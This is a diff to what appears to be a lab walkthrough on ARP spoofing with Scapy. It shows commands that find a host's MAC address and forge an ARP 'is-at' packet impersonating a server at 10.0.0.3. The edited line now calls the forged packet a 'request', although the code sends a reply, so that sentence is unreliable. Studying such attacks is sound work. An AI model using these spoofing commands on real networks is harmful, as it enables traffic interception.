@@ -2372,7 +2372,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-First, we have to ARP request to `10.0.0.2` and retrieved its MAC address.
+First, we have to send an ARP request to `10.0.0.2` and retrieve its MAC address.
 
 ```py
 >>> (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.2")).display()
@@ -2402,9 +2402,9 @@ Received 1 packets, got 1 answers, remaining 0 packets
 'ee:03:45:31:47:c7'
 ```
 
-Then we spoof an ARP reply to `10.0.0.2` claiming that we are `10.0.0.3`, the intended server.
+Then we spoof an ARP request to `10.0.0.2` claiming that we are `10.0.0.3`, the intended server.
 
-```
+```py
 >>> (Ether(dst="ee:03:45:31:47:c7", src="b2:58:67:a3:8a:0a") / ARP(op="is-at", hwsrc="b2:58:67:a3:8a:0a", psrc="10.0.0.3", hwdst="ee:03:45:31:47:c7", pdst="10.0.0.2")).display()
 ###[ Ethernet ]###
   dst       = ee:03:45:31:47:c7
